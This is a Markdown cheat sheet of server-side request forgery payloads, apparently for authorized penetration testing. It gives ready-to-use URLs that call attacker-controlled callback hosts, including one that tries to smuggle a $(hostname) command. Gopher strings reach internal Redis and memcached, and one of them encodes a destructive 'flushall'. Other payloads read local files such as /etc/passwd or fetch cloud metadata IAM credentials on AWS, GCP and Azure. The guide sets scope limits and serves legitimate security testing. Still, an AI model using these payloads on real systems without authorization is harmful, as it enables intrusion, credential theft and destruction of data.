# SSRF Payloads

Any parameter that fetches a URL/host on the server's behalf — webhooks, image/PDF renderers, URL previews, import-from-URL, `xmlrpc`, SVG/PDF pipelines. Goal: prove the server makes a request *you* control to a destination *it* shouldn't reach.

## Tier 1 — Basic / confirm outbound
Point at yourself first; a hit on your listener confirms server-side fetch.
```
http://YOUR-COLLABORATOR/
http://127.0.0.1:80/
http://localhost/
http://[::1]/
http://169.254.169.254/          # cloud metadata, first probe
```

## Tier 2 — Blind / OOB detection
When the response body is not reflected. Use a DNS/HTTP callback (Collaborator/interactsh). DNS resolution alone proves it.
```
http://ssrf.YOURID.oast.fun/
http://YOURID.oast.fun/?x=$(hostname)     # some fetchers won't expand, but try
ftp://YOURID.oast.fun/                     # non-HTTP scheme reach
```
Watch for a *delayed* response or a callback that arrives seconds later = blind SSRF confirmed.

## Tier 3 — Protocol smuggling
When `http/https` is filtered or you need to reach non-HTTP internal services.
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A   # redis (PROVE reach only, do not flush prod)
gopher://127.0.0.1:11211/_stats                               # memcached
dict://127.0.0.1:6379/info                                    # dict → banner grab
file:///etc/passwd                                            # local file read
file:///etc/hostname
ldap://127.0.0.1:389/
```
Gopher lets you craft raw TCP payloads (SMTP, Redis, HTTP POST to internal apps). Prove reachability with a read-only command (`info`, `stats`) — never send a mutating command to a production service.

## Tier 3 — Cloud metadata targets
Highest impact — often lands temporary credentials.
```
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# AWS IMDSv2 needs a token (SSRF must forward headers):
#   PUT /latest/api/token  -H X-aws-ec2-metadata-token-ttl-seconds: 21600
# GCP (requires Metadata-Flavor: Google header)
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/
# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01   # needs Metadata: true
# Alibaba / DigitalOcean / Oracle
http://100.100.100.100/latest/meta-data/
http://169.254.169.254/metadata/v1/
```

## Bypass note
IP-format tricks (decimal/octal/hex/IPv6/DNS-rebind/redirect) live in `../bypass-tables.md`. When a host allowlist or `127.0.0.1` blacklist blocks you, go there.

## Stop when
Impact tier decides the evidence:
- **Blind:** one DNS+HTTP callback from the server's egress IP. Screenshot the interaction log.
- **Internal reach:** one read-only banner (`info`/`stats`) or a `169.254.169.254/latest/meta-data/` directory listing.
- **Credential theft:** retrieve the metadata creds *once*, note the AccessKeyId prefix + expiry to prove validity, do NOT use them against the account's resources. That single retrieval is critical impact.
Stop. No internal port sweeping beyond what proves reach.
